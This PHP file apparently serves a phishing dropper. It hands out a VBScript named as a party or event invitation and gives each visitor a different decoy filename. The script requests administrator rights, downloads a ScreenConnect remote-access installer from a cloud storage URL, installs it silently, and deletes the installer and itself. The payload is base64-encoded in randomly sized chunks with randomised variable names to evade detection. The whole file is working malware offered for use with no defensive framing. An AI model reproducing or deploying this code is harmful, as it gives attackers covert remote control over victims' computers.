<?php
// invite.php - Improved Encoding (Random names + Random chunk size)
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

// ===== Real Payload =====
$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$realVbs = <<<REAL
On Error Resume Next

Dim objShell, objFSO, http, stream, p

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

If WScript.Arguments.Length = 0 Then
    Dim sh
    Set sh = CreateObject("Shell.Application")
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit
End If

p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "$msiUrl", False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile p, 2
    stream.Close
    objShell.Run """" & p & """ /quiet", 0, True
    WScript.Sleep 90000
    If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
End If

objFSO.DeleteFile WScript.ScriptFullName, True
WScript.Quit
REAL;

// ===== Random names =====
function rndName($len = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $name = '';
    for ($i = 0; $i < $len; $i++) {
        $name .= $chars[rand(0, 25)];
    }
    return $name;
}

$arrayName   = rndName(7);
$joinName    = rndName(6);
$funcName    = rndName(9);
$docName     = rndName(6);
$elemName    = rndName(5);
$streamName  = rndName(7);

// ===== Random chunk size =====
$chunkSize = rand(55, 120);

$base64 = base64_encode($realVbs);
$len = strlen($base64);
$count = ceil($len / $chunkSize);

$vbs  = "Option Explicit\r\n";
$vbs .= "Dim $arrayName(" . ($count - 1) . ")\r\n";

for ($i = 0; $i < $count; $i++) {
    $start = $i * $chunkSize;
    $chunk = substr($base64, $start, $chunkSize);
    $vbs .= "$arrayName($i) = \"$chunk\"\r\n";
}

$vbs .= "\r\nDim $joinName : $joinName = Join($arrayName, \"\")\r\n";
$vbs .= "ExecuteGlobal $funcName($joinName)\r\n\r\n";

$vbs .= "Function $funcName(s)\r\n";
$vbs .= " Dim $docName, $streamName, $elemName\r\n";
$vbs .= " Set $docName = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
$vbs .= " Set $elemName = $docName.createElement(\"b\")\r\n";
$vbs .= " $elemName.dataType = \"bin.base64\"\r\n";
$vbs .= " $elemName.text = s\r\n";
$vbs .= " Set $streamName = CreateObject(\"ADODB.Stream\")\r\n";
$vbs .= " $streamName.Type = 1 : $streamName.Open\r\n";
$vbs .= " $streamName.Write $elemName.nodeTypedValue\r\n";
$vbs .= " $streamName.Position = 0\r\n";
$vbs .= " $streamName.Type = 2 : $streamName.Charset = \"UTF-8\"\r\n";
$vbs .= " $funcName = $streamName.ReadText\r\n";
$vbs .= " $streamName.Close\r\n";
$vbs .= "End Function\r\n";

echo $vbs;
?>
